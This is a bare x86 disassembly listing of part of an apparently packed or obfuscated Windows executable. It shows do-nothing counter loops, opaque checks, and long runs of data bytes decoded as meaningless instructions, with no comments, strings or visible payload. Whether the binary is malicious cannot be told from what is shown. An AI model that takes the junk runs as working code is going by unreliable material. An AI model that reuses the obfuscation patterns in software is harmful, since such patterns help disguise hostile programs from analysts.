  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
  40187a:	and    DWORD PTR ds:0x430363,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x430363
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x430363,esi
  401898:	cmp    DWORD PTR ds:0x430363,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x430363,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e82b
  4018bd:	cmp    DWORD PTR ds:0x430363,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x430363
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x430363,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42ec57
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42ec5b,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42ec5b
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42ec5b,esi
  4018fe:	cmp    DWORD PTR ds:0x42ec5b,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42ea8f
  401914:	cmp    DWORD PTR ds:0x42ec5b,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42ec5b
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42ec5b,esi
  40192e:	cmp    DWORD PTR ds:0x42ec5b,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42ec4b,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x43035b,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x43035b
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x43035b,esi
  401966:	cmp    DWORD PTR ds:0x43035b,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x43035b,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e737
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42e917
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x4302bd
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x4302b5,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x4302b5
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x4302b5,ebx
  4019c4:	cmp    DWORD PTR ds:0x4302b5,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e7c5
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e83b
  4019e5:	cmp    DWORD PTR ds:0x4302b5,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0x8bf87f03
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401a01
  401a76:	jnp    0x401a4b
  401a78:	adc    ecx,DWORD PTR [ebx+edx*2-0x12]
  401a7c:	or     DWORD PTR [esp],esp
  401a7f:	js     0x401ae6
  401a81:	rcl    DWORD PTR [edi],1
  401a83:	xlat   BYTE PTR ds:[ebx]
  401a84:	lea    ecx,[eax+0x43eb164c]
  401a8a:	add    al,BYTE PTR [edx-0x4c]
  401a8d:	dec    ecx
  401a8e:	sti    
  401a8f:	adc    ebp,ebp
  401a91:	aaa    
  401a92:	xor    al,BYTE PTR [edx+ecx*4-0x120e63ba]
  401a99:	sub    DWORD PTR [edi+0x5d8bce1a],ebp
  401a9f:	repz sbb ch,BYTE PTR [ebp-0x8]
  401aa3:	iret   
  401aa4:	fstp   TBYTE PTR ds:0xfba19a1b
  401aaa:	cmp    DWORD PTR [edi-0x7941633],edx
  401ab0:	dec    DWORD PTR [edi-0x7c]
  401ab3:	fist   WORD PTR [ebx-0x5760ab9a]
  401ab9:	aaa    
  401aba:	push   0xffffffb1
  401abc:	sbb    al,0x2d
  401abe:	test   al,0x7b
  401ac0:	ret    
  401ac1:	daa    
  401ac2:	sbb    eax,0xdfe93e62
  401ac7:	push   esi
  401ac8:	dec    edx
  401ac9:	mov    esi,0xc15346f0
  401ace:	mov    esp,DWORD PTR [ecx-0x42]
  401ad1:	adc    bl,0x14
  401ad4:	into   
  401ad5:	in     al,dx
  401ad6:	inc    ebx
  401ad7:	jns    0x401b53
  401ad9:	mov    dh,0x84
  401adb:	in     eax,dx
  401adc:	into   
  401add:	ja     0x401b49
  401adf:	fs or  edi,ebx
  401ae2:	dec    eax
  401ae3:	pop    esp
  401ae4:	(bad)  
  401ae5:	in     al,dx
  401ae6:	adc    eax,0x565acee8
  401aeb:	xchg   BYTE PTR [ebx+ebx*4],dh
  401aee:	push   edi
  401aef:	loop   0x401b3b
  401af1:	mov    ds:0x45b2810f,eax
  401af6:	fsubr  DWORD PTR [esi+0x2b8d7a3d]
  401afc:	repnz outs dx,DWORD PTR ds:[esi]
  401afe:	lds    edx,FWORD PTR [ebx+eax*8+0x5f]
  401b02:	cmp    al,0x40
  401b04:	xor    eax,0x9c23b857
  401b09:	je     0x401aaa
  401b0b:	fwait
  401b0c:	jl     0x401ab1
  401b0e:	(bad)  
  401b0f:	fist   DWORD PTR [ebx-0x5f1c67ad]
  401b15:	sub    edx,ebx
  401b17:	sbb    DWORD PTR [edi+0x7e407d97],ebx
  401b1d:	inc    esi
  401b1e:	into   
  401b1f:	mov    al,ds:0xc3ca63a6
  401b24:	mov    ch,0x3d
  401b26:	shl    DWORD PTR [esi],0xd3
  401b29:	jmp    0x401b02
  401b2b:	lea    esp,[edx]
  401b2d:	mov    ah,0x6
  401b2f:	jle    0x401b60
  401b31:	ret    
  401b32:	mov    bh,0xf0
  401b34:	lahf   
  401b35:	mov    bh,0xf8
  401b37:	inc    esi
  401b38:	push   0xbd59e787
  401b3d:	cmp    ch,ch
  401b3f:	xor    eax,DWORD PTR [ebx-0x75ea79a5]
  401b45:	dec    eax
  401b46:	sbb    eax,0x9dfae6a0
  401b4b:	xor    bl,BYTE PTR [eax+0x7f]
  401b4e:	xchg   BYTE PTR [ecx+0x4d8908d],ch
  401b54:	retf   
  401b55:	sti    
  401b56:	add    dl,dl
  401b58:	dec    esp
  401b59:	test   DWORD PTR [eax],esp
  401b5b:	inc    eax
  401b5c:	ins    BYTE PTR es:[edi],dx
  401b5d:	test   al,0x5b
  401b5f:	pop    esi
  401b60:	fdiv   DWORD PTR [ecx]
  401b62:	test   BYTE PTR ds:0x5ffa2bf5,cl
  401b68:	imul   DWORD PTR [edi+0xa]
  401b6b:	add    ah,ah
  401b6d:	outs   dx,DWORD PTR ds:[esi]
  401b6e:	sbb    eax,0x59d81b2a
  401b73:	sbb    al,0x39
  401b75:	das    
  401b76:	sbb    DWORD PTR [ebp-0x32],ebp
  401b79:	jmp    0x6b26:0x37c4f704
  401b80:	dec    eax
  401b81:	arpl   dx,di
  401b83:	cli    
  401b84:	(bad)  
  401b85:	rol    cl,cl
  401b87:	outs   dx,BYTE PTR ss:[esi]
  401b89:	or     cl,BYTE PTR [esi]
  401b8b:	sahf   
  401b8c:	imul   eax,edx,0x7dccdd20
  401b92:	jl     0x401b2f
  401b94:	jb     0x401b65
  401b96:	xor    dh,BYTE PTR [esi+eiz*1+0x51]
  401b9a:	xchg   ebp,eax
  401b9b:	cmp    ah,BYTE PTR [ebx-0x74]
  401b9e:	or     eax,0xfeeb86a3
  401ba3:	ins    BYTE PTR es:[edi],dx
  401ba4:	in     eax,0xf8
  401ba6:	cdq    
  401ba7:	adc    BYTE PTR [edi+edx*4-0x8],bl
  401bab:	sbb    cl,BYTE PTR [edx]
  401bad:	adc    BYTE PTR [esi-0x60],bl
  401bb0:	stc    
  401bb1:	fisttp WORD PTR [ecx]
  401bb3:	push   ebx
  401bb4:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bb6:	fisubr DWORD PTR [edi]
  401bb8:	adc    eax,0x5c3a71ae
  401bbd:	dec    ecx
  401bbe:	out    dx,eax
  401bbf:	jecxz  0x401bf4
  401bc1:	add    BYTE PTR [edi-0xf461def],0xd3
  401bc8:	xor    cl,BYTE PTR [eax]
  401bca:	pop    esi
  401bcb:	dec    edi
  401bcc:	add    edi,DWORD PTR [edi-0x58aecda8]
  401bd2:	dec    ebp
  401bd3:	xchg   esp,eax
  401bd4:	sbb    BYTE PTR [ebp+0x67c52223],0xa5
  401bdb:	mov    ecx,0xb8b436e6
  401be0:	mov    ebx,0x1e39091
  401be5:	adc    ebx,DWORD PTR ds:0x21fc195c
  401beb:	cmp    BYTE PTR [edi],dh
  401bed:	inc    ebx
  401bee:	jl     0x401be7
  401bf0:	mov    ebx,0xc2a458c5
  401bf5:	imul   ecx,DWORD PTR [edi],0x80f0a14e
  401bfb:	pop    edx
  401bfc:	jg     0x401bfd
  401bfe:	imul   edx,ecx,0xf030ff68
  401c04:	inc    ebx
  401c05:	shr    BYTE PTR [eax],cl
  401c07:	ret    0xa0b7
  401c0a:	arpl   WORD PTR [eax+0x51560bd9],cx
  401c10:	adc    DWORD PTR [edi-0x54e079a0],esp
  401c16:	pop    ss
  401c17:	aas    
  401c18:	int3   
  401c19:	adc    bh,BYTE PTR [ebx-0x760bba73]
  401c1f:	inc    ebp
  401c20:	lock mov eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	and    dl,BYTE PTR cs:[ebp+0x56]
  401c94:	xor    BYTE PTR [esi],al
  401c96:	jle    0x401d16
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401c47
  401c9d:	dec    esp
  401c9e:	cmp    al,0xbf
  401ca0:	mov    eax,0xca5ef497
  401ca5:	rcl    dh,0x94
  401ca8:	mov    ebp,0x20685b70
  401cad:	mov    eax,ds:0x139037f3
  401cb2:	mov    al,ds:0xe7747c12
  401cb7:	(bad)  
  401cb8:	mov    ds:0x765704cb,al
  401cbd:	gs pop esp
  401cbf:	lahf   
  401cc0:	repz pop ss
  401cc2:	mov    al,ds:0xe5075a68
  401cc7:	xor    al,BYTE PTR ds:[esp+ebx*4-0x3e]
  401ccc:	out    0xa4,eax
  401cce:	push   ds
  401ccf:	cld    
  401cd0:	sbb    BYTE PTR [eax],ah
  401cd2:	inc    edi
  401cd3:	add    eax,0x44ed46f2
  401cd8:	pop    ebx
  401cd9:	jns    0x401d54
  401cdb:	mov    WORD PTR [esi],gs
  401cdd:	dec    ebp
  401cde:	in     eax,0x8c
  401ce0:	cs inc ebx
  401ce2:	aaa    
  401ce3:	out    0xbc,al
  401ce5:	or     BYTE PTR [ebp+0x6e],0x3e
  401ce9:	pop    eax
  401cea:	mov    ch,0xf4
  401cec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ced:	repz dec edx
  401cef:	daa    
  401cf0:	adc    edx,DWORD PTR ds:[ecx+eiz*4+0x6b]
  401cf5:	mov    esi,0x98eaf2d1
  401cfa:	loop   0x401cea
  401cfc:	mov    ds:0x33e37e9a,al
  401d01:	cmp    eax,0x5c01dcb3
  401d06:	js     0x401cf9
  401d08:	nop
  401d09:	inc    ecx
  401d0a:	es sub al,0x27
  401d0d:	cs sub dh,al
  401d10:	int3   
  401d11:	push   edx
  401d12:	xchg   edx,eax
  401d13:	sub    al,0xe6
  401d15:	shr    BYTE PTR [eax-0x4c],cl
  401d18:	fs retf 0x77c0
  401d1c:	xor    BYTE PTR [edx],ch
  401d1e:	sbb    al,0xbd
  401d20:	sbb    BYTE PTR ds:0x704fc3fd,bl
  401d26:	xchg   esi,eax
  401d27:	lock pop esp
  401d29:	mul    ch
  401d2b:	idiv   BYTE PTR [ebp+0x77]
  401d2e:	mov    ds:0x4cba8514,eax
  401d33:	inc    esi
  401d34:	cli    
  401d35:	ficom  DWORD PTR [edx+eax*2]
  401d38:	retf   0x3078
  401d3b:	neg    DWORD PTR [edi+0x2614bed5]
  401d41:	test   al,dh
  401d43:	sti    
  401d44:	push   edx
  401d45:	mov    ds:0xed358775,eax
  401d4a:	stos   BYTE PTR es:[edi],al
  401d4b:	stos   DWORD PTR es:[edi],eax
  401d4c:	mov    ebx,0xb617c5c2
  401d51:	imul   edx,DWORD PTR [ecx],0x7f
  401d54:	inc    esp
  401d55:	mov    WORD PTR [eax-0x2383677c],gs
  401d5b:	pop    ecx
  401d5c:	and    BYTE PTR [eax+0x476d8947],ch
  401d62:	xor    BYTE PTR [ebx-0x2817e403],cl
  401d68:	cwde   
  401d69:	xor    eax,0x5b0e2825
  401d6e:	call   0xeeba:0x2f0a94a5
  401d75:	mov    cl,0xd9
  401d77:	lods   al,BYTE PTR ds:[esi]
  401d78:	xlat   BYTE PTR ds:[ebx]
  401d79:	xchg   ebp,eax
  401d7a:	add    DWORD PTR [ecx+0x5b],esi
  401d7d:	rcr    DWORD PTR [edx-0x5a353df0],0xde
  401d84:	mov    ebp,0xfdab63bf
  401d89:	mov    ch,0x17
  401d8b:	clc    
  401d8c:	cdq    
  401d8d:	dec    esp
  401d8e:	jmp    0xee94:0x4c7705d1
  401d95:	ins    BYTE PTR es:[edi],dx
  401d96:	mov    ds:0x3ee0ee8a,eax
  401d9b:	dec    eax
  401d9c:	cmc    
  401d9d:	adc    al,0xa9
  401d9f:	xor    al,0x4a
  401da1:	xor    al,0x75
  401da3:	repnz sub dl,BYTE PTR [ebp+edx*2+0x7]
  401da8:	add    ecx,DWORD PTR [eax]
  401daa:	cli    
  401dab:	repnz pop ebp
  401dad:	mov    bh,0xd7
  401daf:	xchg   BYTE PTR [eax],cl
  401db1:	jbe    0x401deb
  401db3:	push   eax
  401db4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401db5:	mov    bh,0x94
  401db7:	(bad)  
  401db8:	shl    BYTE PTR [edx+0x7e],0xbb
  401dbc:	in     eax,dx
  401dbd:	adc    eax,ebp
  401dbf:	fld    st(4)
  401dc1:	mov    WORD PTR [ebx],?
  401dc3:	lea    edi,[edx+0x15]
  401dc6:	jl     0x401d98
  401dc8:	sub    eax,0xa3ef0c0
  401dcd:	imul   esi,DWORD PTR [ebx+0x26],0xffffff85
  401dd1:	xchg   BYTE PTR [eax+0x3d5699df],ah
  401dd7:	(bad)  
  401dd8:	mov    ah,0x80
  401dda:	jo     0x401da8
  401ddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ddd:	cmp    BYTE PTR [edi],0x15
  401de0:	adc    al,0xf6
  401de2:	mov    ecx,0xda7acc14
  401de7:	sbb    ecx,DWORD PTR [ecx+0x4]
  401dea:	cmp    esi,DWORD PTR [ecx+ebp*4+0x1b]
  401dee:	or     ah,dh
  401df0:	mov    al,0xb7
  401df2:	adc    dh,ch
  401df4:	pop    eax
  401df5:	js     0x401d93
  401df7:	jge    0x401e19
  401df9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dfa:	ds je  0x401d82
  401dfd:	(bad)  
  401dfe:	xor    dl,al
  401e00:	fisttp WORD PTR [esi]
  401e02:	or     edx,DWORD PTR [edi-0x5b]
  401e05:	pop    ecx
  401e06:	sub    BYTE PTR [esi-0x2b],ch
  401e09:	xchg   ch,ah
  401e0b:	shl    DWORD PTR [ebp+0x9],0xf7
  401e0f:	test   eax,0x5fa1128e
  401e14:	out    dx,al
  401e15:	scas   eax,DWORD PTR es:[edi]
  401e16:	push   ebx
  401e17:	cmp    al,0x68
  401e19:	fnstsw WORD PTR [ebp-0x4e410681]
  401e1f:	add    eax,0xeb46ee65
  401e24:	jecxz  0x401e7a
  401e26:	mov    ebx,0x5140ab6f
  401e2b:	sub    eax,0x4fa5d3b5
  401e30:	clc    
  401e31:	dec    edi
  401e32:	xchg   esi,eax
  401e33:	dec    ebx
  401e34:	jmp    0x3772:0x2f425c70
  401e3b:	mov    ebx,0x376726ff
  401e40:	push   ss
  401e41:	jmp    0xfacf4ec7
  401e46:	push   eax
  401e47:	es jmp 0x4020a4
  401e4d:	mov    ax,WORD PTR [ebp-0x4]
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	and    al,0x9a
  401e82:	mov    bl,0xb6
  401e84:	pop    edx
  401e85:	pop    es
  401e86:	jle    0x401f06
  401e88:	cwde   
  401e89:	jg     0x401f09
  401e8b:	jle    0x401e7e
  401e8d:	and    al,BYTE PTR [ebx-0x4497582d]
  401e93:	dec    eax
  401e94:	inc    esi
  401e95:	xchg   ebp,eax
  401e96:	test   eax,0x8ce9b4dd
  401e9b:	mov    bl,0x5d
  401e9d:	stos   BYTE PTR es:[edi],al
  401e9e:	jmp    0x401eb7
  401ea0:	mov    ebx,0x4f3b175
  401ea5:	sub    al,0x5f
  401ea7:	fimul  WORD PTR [edx+0x7d701d10]
  401ead:	(bad)  
  401eae:	push   ebx
  401eaf:	in     eax,dx
  401eb0:	daa    
  401eb1:	mov    eax,0x57a17d5a
  401eb6:	jl     0x401e53
  401eb8:	inc    esp
  401eb9:	adc    DWORD PTR [ebp+0x3f],ebx
  401ebc:	and    DWORD PTR [ecx+0x73],ebx
  401ebf:	sub    BYTE PTR [eax-0x1e0f9247],dh
  401ec5:	test   BYTE PTR [edi-0x22],ah
  401ec8:	lods   eax,DWORD PTR ds:[esi]
  401ec9:	cs cld 
  401ecb:	ins    BYTE PTR es:[edi],dx
  401ecc:	pop    ebx
  401ecd:	adc    eax,0x7b83139d
  401ed2:	jns    0x401ef7
  401ed4:	gs aaa 
  401ed6:	inc    edi
  401ed7:	in     al,dx
  401ed8:	mov    bh,0x3e
  401eda:	xchg   esi,eax
  401edb:	jns    0x401edf
  401edd:	test   eax,0xba524ad5
  401ee2:	pusha  
  401ee3:	sbb    DWORD PTR es:[eax+0x72ce691a],esi
  401eea:	js     0x401f12
  401eec:	sub    ecx,edi
  401eee:	xor    edx,ebp
  401ef0:	sbb    eax,ecx
  401ef2:	jg     0x401e8d
  401ef4:	dec    edx
  401ef5:	mov    al,0xaa
  401ef7:	call   0x2e4403f3
  401efc:	dec    ebx
  401efd:	scas   al,BYTE PTR es:[edi]
  401efe:	push   edi
  401eff:	pop    es
  401f00:	cli    
  401f01:	mov    ebp,0x8966f2d7
  401f06:	jns    0x401f63
  401f08:	adc    DWORD PTR [edi+ebx*1+0x10],esi
  401f0c:	push   ss
  401f0d:	add    al,0x74
  401f0f:	cwde   
  401f10:	adc    DWORD PTR [ebx],esp
  401f12:	push   ecx
  401f13:	mov    al,0xb4
  401f15:	pop    ebx
  401f16:	test   BYTE PTR [eax-0x80],0xa6
  401f1a:	push   ebp
  401f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f1c:	pushf  
  401f1d:	or     al,0x34
  401f1f:	jecxz  0x401f0e
  401f21:	xor    DWORD PTR [eax],ecx
  401f23:	xchg   edi,eax
  401f24:	mov    dl,0x4f
  401f26:	cmp    eax,0x90efe998
  401f2b:	cld    
  401f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f2d:	cmp    BYTE PTR [edx-0x13],ah
  401f30:	shl    DWORD PTR [edi+eiz*4],0xec
  401f34:	xor    edi,edx
  401f36:	jl     0x401f61
  401f38:	mov    dh,0xae
  401f3a:	and    al,0xe1
  401f3c:	xchg   ebp,eax
  401f3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f3e:	imul   ah
  401f40:	or     bl,BYTE PTR [ebp-0x746047a8]
  401f46:	and    eax,0xa08f736b
  401f4b:	ins    BYTE PTR es:[edi],dx
  401f4c:	pop    edi
  401f4d:	ja     0x401f9b
  401f4f:	in     al,0xba
  401f51:	lea    ebx,[esi]
  401f53:	call   0xa79f:0xde9d3255
  401f5a:	mov    edx,0x151c7c63
  401f5f:	clc    
  401f60:	sti    
  401f61:	shl    bl,0xc6
  401f64:	inc    edx
  401f66:	fdivrp st(2),st
  401f68:	aaa    
  401f69:	add    al,BYTE PTR [ebx-0x29]
  401f6c:	ja     0x401fdf
  401f6e:	dec    esp
  401f6f:	pop    ebp
  401f70:	call   0x806f:0xe9eafe4
  401f77:	jp     0x401fb2
  401f79:	inc    eax
  401f7a:	ret    
  401f7b:	xchg   ecx,ebx
  401f7d:	mov    bh,0xf4
  401f7f:	pop    esi
  401f80:	cmc    
  401f81:	idiv   dl
  401f83:	outs   dx,DWORD PTR ds:[esi]
  401f84:	jnp    0x401fa9
  401f86:	xor    eax,0x710cb116
  401f8b:	mov    ecx,0x1a467366
  401f90:	pop    ds
  401f91:	mov    ah,0x28
  401f93:	test   al,0x45
  401f95:	xlat   BYTE PTR ds:[ebx]
  401f96:	adc    esi,DWORD PTR [ebx+ecx*8-0x3c]
  401f9a:	in     eax,dx
  401f9b:	rcl    ebx,0xb2
  401f9e:	fisub  DWORD PTR [esp+ebp*2+0x3d]
  401fa2:	mov    eax,0xe60c698d
  401fa7:	sub    bh,dl
  401fa9:	add    eax,0x399dcbcf
  401fae:	mov    ah,0x4f
  401fb0:	cmp    BYTE PTR [eax+0x63d8f6ff],0xe0
  401fb7:	pusha  
  401fb8:	adc    DWORD PTR [ecx],edx
  401fba:	stc    
  401fbb:	mov    WORD PTR [edi-0x2b],ds
  401fbe:	push   0x298d60f5
  401fc3:	xor    bh,0x11
  401fc6:	aaa    
  401fc7:	popf   
  401fc8:	jns    0x401f76
  401fca:	test   esi,ebp
  401fcc:	push   ecx
  401fcd:	mov    al,ds:0x43599555
  401fd2:	mov    BYTE PTR [esi-0x1edad7f1],ch
  401fd8:	mov    ch,0x95
  401fda:	mov    ebp,0xcb1cd5ce
  401fdf:	out    dx,eax
  401fe0:	jo     0x40205c
  401fe2:	iret   
  401fe3:	xor    al,0x75
  401fe5:	dec    ecx
  401fe6:	add    al,BYTE PTR [esi-0x5ee1c16e]
  401fec:	adc    eax,0x109c206f
  401ff1:	test   ebp,edi
  401ff3:	or     eax,edi
  401ff5:	cwde   
  401ff6:	sub    eax,DWORD PTR [ecx-0x5530d90b]
  401ffc:	shl    BYTE PTR [edi+0x4761a982],0x96
  402003:	inc    ebx
  402004:	sbb    al,0xd2
  402006:	jg     0x401f8e
  402008:	push   0xffffff83
  40200a:	mov    edx,0x41af47e5
  40200f:	xor    eax,0x38f350cc
  402014:	add    ebp,ecx
  402016:	leave  
  402017:	lods   eax,DWORD PTR ds:[esi]
  402018:	xor    ebx,DWORD PTR es:[esi]
  40201b:	lods   al,BYTE PTR ds:[esi]
  40201c:	fidiv  DWORD PTR [ebp-0x79e22276]
  402022:	cmp    al,0x8c
  402024:	rol    dh,cl
  402026:	adc    BYTE PTR [eax],ch
  402028:	int    0x1e
  40202a:	and    eax,0xb5566bec
  40202f:	shl    DWORD PTR [ecx+ecx*2+0x3],1
  402033:	(bad)  
  402034:	mov    DWORD PTR [ebp-0x30],eax
  402037:	mov    eax,DWORD PTR [ebp-0x34]
  40203a:	mov    dx,WORD PTR [ebp-0x38]
  40203e:	mov    ebx,0x8a3c
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	xor    edi,DWORD PTR [edx+0x5841c61]
  4020ea:	jle    0x40216a
  4020ec:	push   ebp
  4020ed:	jg     0x40216d
  4020ef:	jle    0x4020fb
  4020f1:	cwde   
  4020f2:	ins    BYTE PTR es:[edi],dx
  4020f3:	push   esi
  4020f4:	bound  esp,QWORD PTR [edi-0x7e]
  4020f7:	ret    0xfec8
  4020fa:	sub    eax,0x493aaac
  4020ff:	(bad)  
  402101:	(bad)  
  402102:	fstp   QWORD PTR [ebp+0x5]
  402105:	xchg   esp,eax
  402106:	lea    ecx,[ebx]
  402108:	popf   
  402109:	(bad)  
  40210a:	imul   esi
  40210c:	push   ss
  40210d:	dec    edi
  40210e:	jmp    0x4020c9
  402110:	jle    0x4020c7
  402112:	stos   BYTE PTR es:[edi],al
  402113:	shl    DWORD PTR [eax+ecx*1],1
  402116:	xchg   ebp,esp
  402118:	jnp    0x4020fe
  40211a:	xchg   edx,eax
  40211b:	mov    esp,0x75eda44a
  402120:	inc    esi
